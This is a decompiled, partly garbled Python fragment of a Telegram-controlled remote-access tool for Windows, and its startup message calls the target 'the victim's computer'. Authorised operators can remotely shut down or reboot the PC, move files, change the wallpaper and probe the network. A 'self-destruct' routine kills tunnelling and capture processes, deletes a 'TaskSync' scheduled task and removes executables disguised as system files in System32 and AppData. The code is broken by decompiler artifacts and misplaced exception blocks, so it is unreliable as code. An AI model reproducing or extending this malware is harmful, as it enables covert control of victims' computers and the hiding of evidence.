                info = {}
            except Exception as e:
                    return f'–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Å–µ—Ç–∏: {e}'

        async def resolve_dns(host):
            try:
                ip = socket.gethostbyname(host)
                return f'IP-–∞–¥—Ä–µ—Å –¥–ª—è {host}: {ip}'
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ —Ä–∞–∑—Ä–µ—à–µ–Ω–∏—è DNS: {e}'

        async def check_website(url):
            try:
                response = requests.get(url)
                return f'–°—Ç–∞—Ç—É—Å —Å–∞–π—Ç–∞ {url}: {response.status_code} ({response.reason})'
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Å–∞–π—Ç—É: {e}'

        async def get_external_ip():
            try:
                response = requests.get('https://api.ipify.org?format=json')
                return f"–í–Ω–µ—à–Ω–∏–π IP-–∞–¥—Ä–µ—Å: {response.json().get('ip')}"
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –≤–Ω–µ—à–Ω–µ–≥–æ IP: {e}'

        async def network_traffic():
            try:
                net_info = psutil.net_io_counters()
                return f'–ü—Ä–∏–Ω—è—Ç–æ –¥–∞–Ω–Ω—ã—Ö: {net_info.bytes_recv / 1000000:.2f} –ú–ë\n–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –¥–∞–Ω–Ω—ã—Ö: {net_info.bytes_sent / 1000000:.2f} –ú–ë'
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —Ç—Ä–∞—Ñ–∏–∫–µ: {e}'

        async def get_mtu(interface):
            try:
                mtu = psutil.net_if_stats()[interface].mtu
                return f'MTU –¥–ª—è –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ {interface}: {mtu}'
            except Exception as e:
                return f'–û—à–∏–±–∫–∞ –ø–æ–ª—É—á–µ–Ω–∏—è MTU: {e}'

        async def generate_report():
            report = []
            report.append('–û—Ç—á–µ—Ç –æ —Å–µ—Ç–∏\n')
            try:
                report.append('–†–µ–∑—É–ª—å—Ç–∞—Ç—ã –ø–∏–Ω–≥–∞:\n')
                report.append(await ping('google.com') + '\n')
                except Exception as e:
                    report.append('–†–µ–∑—É–ª—å—Ç–∞—Ç—ã —Ç—Ä–∞—Å—Å–∏—Ä–æ–≤–∫–∏ –º–∞—Ä—à—Ä—É—Ç–∞:\n')
                    report.append(await traceroute('google.com') + '\n')
                report.append(f'–û—à–∏–±–∫–∞ –ø—Ä–∏ —Å–æ–∑–¥–∞–Ω–∏–∏ –æ—Ç—á–µ—Ç–∞: {e}\n')
        await generate_report()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

def confirmation_menu(arg):
    keyboard = InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text='‚úÖ –î–∞', callback_data=f'con_yes_{arg}'), InlineKeyboardButton(text='‚ùå –ù–µ—Ç', callback_data=f'con_no_{arg}')]])
    return keyboard

@dp.message(lambda message: message.text and message.text.lower() == '–≤—ã–∫–ª—é—á–∏—Ç—å –ø–∫')
async def start_decipher(message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–í—ã —Ç–æ—á–Ω–æ —Ö–æ—Ç–∏—Ç–µ –≤—ã–∫–ª—é—á–∏—Ç—å –ü–ö?*', reply_markup=confirmation_menu('of'), parse_mode='Markdown')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.callback_query()
async def handle_callback(query: types.CallbackQuery, state: FSMContext):
    if query.data == 'con_yes_of':
        await query.message.edit_text('–û–ö, –≤—ã–∫–ª—é—á–∞—é –ü–ö ‚úÖ', reply_markup=None, parse_mode='Markdown')
        os.system('shutdown /s /t 1')
        return
    else:  # inserted
        if query.data == 'con_no_of':
            await query.message.edit_text('–û—Ç–º–µ–Ω–µ–Ω–æ ‚ùå', reply_markup=None, parse_mode='Markdown')
        else:  # inserted
            if query.data == 'con_yes_rs':
                await query.message.edit_text('–û–ö, –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∂–∞—é –ü–ö ‚úÖ', reply_markup=None, parse_mode='Markdown')
                os.system('shutdown /r /t 1')
            else:  # inserted
                if query.data == 'con_no_rs':
                    await query.message.edit_text('–û—Ç–º–µ–Ω–µ–Ω–æ ‚ùå', reply_markup=None, parse_mode='Markdown')

@dp.message(lambda message: message.text and message.text.lower() == '–ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ø–∫')
async def start_decipher(message):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('*–í—ã —Ç–æ—á–Ω–æ —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–∑–∞–≥—Ä—É–∑–∏—Ç—å –ü–ö?*', reply_markup=confirmation_menu('rs'), parse_mode='Markdown')
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(F.text.lower() == '–ø–æ–º–µ–Ω—è—Ç—å –æ–±–æ–∏')
async def wallpaper(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–•–æ—Ä–æ—à–æ, –æ—Ç–ø—Ä–∞–≤—å—Ç–µ —Ñ–æ—Ç–æ.')
        await state.set_state(WaitingForInput.waiting_for_wallpaper_image)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_wallpaper_image, F.content_type.in_([ContentType.PHOTO, ContentType.DOCUMENT]))
async def receiving_photo(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        try:
            if message.content_type == ContentType.PHOTO:
                photo = message.photo[(-1)]
                file_id = photo.file_id
                file_name = f'{file_id}.jpg'
            else:  # inserted
                if message.content_type == ContentType.DOCUMENT:
                    document = message.document
                    file_id = document.file_id
                    file_name = document.file_name
            file_info = await bot.get_file(file_id)
        except FileNotFoundError:
                file_path = file_info.file_path
                file = await bot.download_file(file_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')
        await message.reply('–û—à–∏–±–∫–∞: —Ñ–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω.')
        return
    except Exception as e:
        full_path = os.path.abspath(image_path)
        SPI_SETDESKWALLPAPER = 20
        ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, full_path, 3)
        await message.reply(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –æ—à–∏–±–∫–∞: {e}')
        return None

@dp.message(F.text.lower() == '–ø–µ—Ä–µ–º–∏—Å—Ç–∏—Ç—å —Ñ–∞–π–ª')
async def start_move_file(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer('–•–æ—Ä–æ—à–æ, –≤–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å —Ñ–∞–π–ª–∞, –∫–æ—Ç–æ—Ä—ã–π —Ö–æ—Ç–∏—Ç–µ –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å (–Ω–∞–ø—Ä–∏–º–µ—Ä, C:/Users/Public/–ù–∞–∑–≤–∞–Ω–∏–µ_—Ñ–∞–π–ª–∞.txt):')
        await state.set_state(WaitingForInput.waiting_for_file_move_source_path)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_file_move_source_path)
async def get_source_path(message: types.Message, state: FSMContext):
    source_path = message.text
    if not os.path.isfile(source_path):
        await message.answer('–§–∞–π–ª –Ω–µ –Ω–∞–π–¥–µ–Ω. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –ø—É—Ç—å –∫ —Ñ–∞–π–ª—É —É–∫–∞–∑–∞–Ω –ø—Ä–∞–≤–∏–ª—å–Ω–æ –∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å.')
        await state.clear()
        return
    else:  # inserted
        await state.update_data(source_path=source_path)
        await message.answer('–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏—Ç–µ –ø—É—Ç—å, –∫—É–¥–∞ –Ω—É–∂–Ω–æ –ø–µ—Ä–µ–º–µ—Å—Ç–∏—Ç—å —Ñ–∞–π–ª (–Ω–∞–ø—Ä–∏–º–µ—Ä, C:/Users/Public/–¶–µ–ª–µ–≤–∞—è_–ø–∞–ø–∫–∞/):')
        await state.set_state(WaitingForInput.waiting_for_file_move_destination_path)

@dp.message(WaitingForInput.waiting_for_file_move_destination_path)
async def get_destination_path(message: types.Message, state: FSMContext):
    destination_path = message.text
    data = await state.get_data()
    source_path = data.get('source_path')
    if not os.path.isdir(destination_path):
        await message.answer('–¶–µ–ª–µ–≤–∞—è –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, —É–±–µ–¥–∏—Ç–µ—Å—å, —á—Ç–æ –ø—É—Ç—å –∫ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ —É–∫–∞–∑–∞–Ω –ø—Ä–∞–≤–∏–ª—å–Ω–æ –∏ –ø–µ—Ä–µ–∑–∞–ø—É—Å—Ç–∏—Ç–µ –ø—Ä–æ—Ü–µ—Å—Å.')
        await state.clear()
    else:  # inserted
        try:
            shutil.move(source_path, destination_path)
            await message.answer(f'–§–∞–π–ª —É—Å–ø–µ—à–Ω–æ –ø–µ—Ä–µ–º–µ—â—ë–Ω –≤ {destination_path}.')
        except FileNotFoundError:
                await message.answer('–§–∞–π–ª –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—è –Ω–µ –Ω–∞–π–¥–µ–Ω—ã. –ü—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—É—Ç—å.')
            except PermissionError:
                await message.answer('–ù–µ–¥–æ—Å—Ç–∞—Ç–æ—á–Ω–æ –ø—Ä–∞–≤ –¥–ª—è –ø–µ—Ä–µ–º–µ—â–µ–Ω–∏—è —Ñ–∞–π–ª–∞. –ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø—Ä–æ–≤–µ—Ä—å—Ç–µ –ø—Ä–∞–≤–∞ –¥–æ—Å—Ç—É–ø–∞.')
            except OSError as e:
                await message.answer(f'–û—à–∏–±–∫–∞ –¥–æ—Å—Ç—É–ø–∞ –∫ —Ñ–∞–π–ª—É –∏–ª–∏ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏: {e}')
            except Exception as e:
                await message.answer(f'–ü—Ä–æ–∏–∑–æ—à–ª–∞ –Ω–µ–ø—Ä–µ–¥–≤–∏–¥–µ–Ω–Ω–∞—è –æ—à–∏–±–∫–∞: {e}')

@dp.message(F.text.lower() == '—Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ')
async def start_move_file(message: types.Message, state: FSMContext):
    if message.date.timestamp() < START_TIME:
        return
    if message.from_user.id in ALLOWED_USER_ID:
        await message.answer(f'–í—ã —É–≤–µ—Ä–µ–Ω—ã —á—Ç–æ —Ö–æ—Ç–∏—Ç–µ —ç—Ç–æ —Å–¥–µ–ª–∞—Ç—å? \n–î–ª—è –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è –æ—Ç–ø—Ä–∞–≤—Ç–µ–µ —ç—Ç—É –∫–æ–º–±–∏–Ω–∞—Ü–∏—é:\'{a}\'')
        await state.set_state(WaitingForInput.waiting_for_self_destruction_code)
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

@dp.message(WaitingForInput.waiting_for_self_destruction_code)
async def get_destination_path(message: types.Message, state: FSMContext):
    if message.from_user.id in ALLOWED_USER_ID:
        code = message.text

        async def kill_process_by_name(process_name):
            try:
                subprocess.run(['taskkill', '/IM', process_name, '/F'], check=True)
            except subprocess.CalledProcessError as e:
                return
        if code == str(a):
            await message.answer('–ë—ã–ª–æ –ø—Ä–∏—è—Ç–Ω–æ —Å –≤–∞–º–∏ –ø–æ—Ä–∞–±–æ—Ç–∞—Ç—å, –°—ç—Ä. –í—ã–ø–æ–ª–Ω—è—é –ø—Ä–æ—Ç–æ–∫–æ–ª \'—Å–∞–º–æ—É–Ω–∏—á—Ç–æ–∂–µ–Ω–∏–µ\'.')
            cloudflared_name = 'cloudflared-windows-amd64.exe'
            ffmpeg_name = 'ffmpeg.exe'
            await kill_process_by_name(cloudflared_name)
            await kill_process_by_name(ffmpeg_name)
            await kill_process_by_name(flask_name)
            await asyncio.sleep(5)
            if os.path.exists(ffmpeg_path):
                os.remove(ffmpeg_path)
            if os.path.exists(cloudflared_path):
                os.remove(cloudflared_path)
            if os.path.exists(flask_path):
                os.remove(flask_path)
            task_name = 'TaskSync'
            command = ['schtasks', '/delete', '/tn', task_name, '/f']

            def task_exists(task_name):
                """–ü—Ä–æ–≤–µ—Ä–∫–∞ –Ω–∞–ª–∏—á–∏—è –∑–∞–¥–∞—á–∏ –≤ —Ä–∞—Å–ø–∏—Å–∞–Ω–∏–∏"""  # inserted
                try:
                    result = subprocess.run(['schtasks', '/query', '/tn', task_name], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    return result.returncode == 0
                except Exception as e:
                    print(f'Error checking task existence: {e}')
                    return False

            def self_destruct(delete_command):
                try:
                    if task_exists(task_name):
                        subprocess.run(command, check=True)
                    else:  # inserted
                        if False:
                            pass  # postinserted
                    except Exception as e:
                        pass  # postinserted
                    else:  # inserted
                        try:
                            subprocess.Popen(f'ping localhost -n 5 > nul && {delete_command}', shell=True, creationflags=subprocess.CREATE_NO_WINDOW)
                except Exception as e:
                        else:  # inserted
                            os._exit(0)
                        pass
                pass
                    print(f'Error during self destruction: {e}')

            def kill_process_by_name(name):
                for proc in psutil.process_iter(['pid', 'name']):
                    try:
                        if proc.info['name'].lower() == name.lower():
                            proc.kill()
                    except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                        pass  # postinserted
                    pass
                else:  # inserted
                    pass
            if __name__ == '__main__':
                appdata_local = os.path.expandvars('%LOCALAPPDATA%')
                folder_path = os.path.join(appdata_local, 'SystemEchoData')
                file_name = 'SystemEcho.exe'
                delete_command1 = os.path.join(folder_path, file_name)
                exe_path1 = sys.executable
                delete_command = f'del \"{exe_path1}\"'
                kill_process_by_name('AppShellSurrogate.exe')
                defolt = 'C:/Users/Default/AppData/Local/Microsoft/Windows/Shell/ShellSyncApp.exe'
                if os.path.isfile(defolt):
                    os.remove(defolt)
                delete_command1 = 'C:\\Windows\\System32\\AppShellSurrogate.exe'
                if os.path.isfile(delete_command1):
                    os.remove(delete_command1)
                time.sleep(1)
                self_destruct(delete_command)
                sys.exit()
        else:  # inserted
            await message.answer('–ö–æ–º–±–∏–Ω–∞—Ü–∏—è –±—ã–ª–∞ –≤–≤–µ–¥–µ–Ω–∞ –Ω–µ–≤–µ—Ä–Ω–æ. –ü—Ä–æ–¥–æ–ª–∂–∞—é —Ä–∞–±–æ—Ç–∞—Ç—å –¥–∞–ª—å—à–µ —Å –≤–∞–º–∏, –°—ç—Ä.')
            await state.clear()
    else:  # inserted
        await message.answer('–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, —É –≤–∞—Å –Ω–µ—Ç –¥–æ—Å—Ç—É–ø–∞ –∫ —ç—Ç–æ–º—É –±–æ—Ç—É.')

async def send():
    for i in ALLOWED_USER_ID:
        try:
            await bot.send_message(i, '–ö–æ–º–ø—å—é—Ç–µ—Ä –∂–µ—Ä—Ç–≤—ã –≤–∫–ª—é—á—ë–Ω. ‚úÖ\n/start üëà –∫–ª–∞–≤–∏–∞—Ç—É—Ä–∞')
    except:
        pass

async def main():
    if False:
        try:
            await send()
                await dp.start_polling(bot)
if __name__ == '__main__':
    asyncio.run(main())
